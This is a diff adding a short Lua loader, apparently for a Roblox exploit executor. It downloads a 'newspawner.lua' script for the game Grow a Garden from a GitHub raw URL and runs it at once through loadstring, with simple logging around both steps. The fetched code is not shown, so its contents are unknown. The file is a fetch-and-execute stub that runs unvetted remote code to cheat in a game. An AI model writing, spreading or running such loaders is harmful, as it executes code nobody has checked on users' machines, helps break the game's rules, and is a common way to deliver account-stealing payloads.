@@ -1,0 +1,42 @@
+local DEBUG = true
+
+local function log(msg)
+    if DEBUG then
+        warn("[ScriptLoader]: " .. msg)
+    end
+end
+
+local function fetchScript(url)
+    local success, result = pcall(function()
+        return game:HttpGet(url)
+    end)
+    
+    if success then
+        log("Script fetched successfully.")
+        return result
+    else
+        warn("Failed to fetch script: " .. tostring(result))
+        return nil
+    end
+end
+
+local function executeScript(scriptCode)
+    local success, err = pcall(function()
+        loadstring(scriptCode)()
+    end)
+
+    if success then
+        log("Script executed successfully.")
+    else
+        warn("Script execution failed: " .. tostring(err))
+    end
+end
+
+-- Primary URL
+local scriptUrl = "https://raw.githubusercontent.com/Zenxq/growagarden/refs/heads/main/newspawner.lua"
+
+-- Fetch and execute
+local code = fetchScript(scriptUrl)
+if code then
+    executeScript(code)
+end
